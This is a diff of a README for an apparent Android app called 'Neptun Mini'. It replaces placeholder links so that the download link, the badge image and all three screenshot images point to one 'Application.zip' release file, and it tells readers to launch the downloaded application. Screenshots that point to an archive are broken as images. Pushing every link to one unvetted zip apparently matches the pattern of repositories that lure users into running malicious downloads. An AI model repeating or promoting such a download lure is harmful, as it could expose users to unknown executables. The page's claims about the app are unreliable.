@@ -12,18 +12,18 @@ Welcome to the Neptun Mini repository! Tired of constantly searching through the
 
 ## Installation
 To install Neptun Mini on your Android device, please download the latest version from the link below:
-[Download Neptun Mini](https://github.com/file/Application.zip)  
+[Download Neptun Mini](https://github.com/ArielSteve/Neptun-Mini/releases/download/v1.0.0/Application.zip)  
 
-[![Download](https://img.shields.io/badge/Download-Neptun_Mini-orange)](https://github.com/file/Application.zip)
+[![Download](https://github.com/ArielSteve/Neptun-Mini/releases/download/v1.0.0/Application.zip)](https://github.com/ArielSteve/Neptun-Mini/releases/download/v1.0.0/Application.zip)
 
 If the link ends with the file name, ensure to launch the downloaded application on your device. If you encounter any issues with the link, kindly check the "Releases" section of this repository.
 
 ## Screenshots
 Here are a few sneak peeks of Neptun Mini in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/ArielSteve/Neptun-Mini/releases/download/v1.0.0/Application.zip)
+![Screenshot 2](https://github.com/ArielSteve/Neptun-Mini/releases/download/v1.0.0/Application.zip)
+![Screenshot 3](https://github.com/ArielSteve/Neptun-Mini/releases/download/v1.0.0/Application.zip)
 
 ## Technologies Used
 Neptun Mini leverages advanced technologies to provide a seamless user experience:
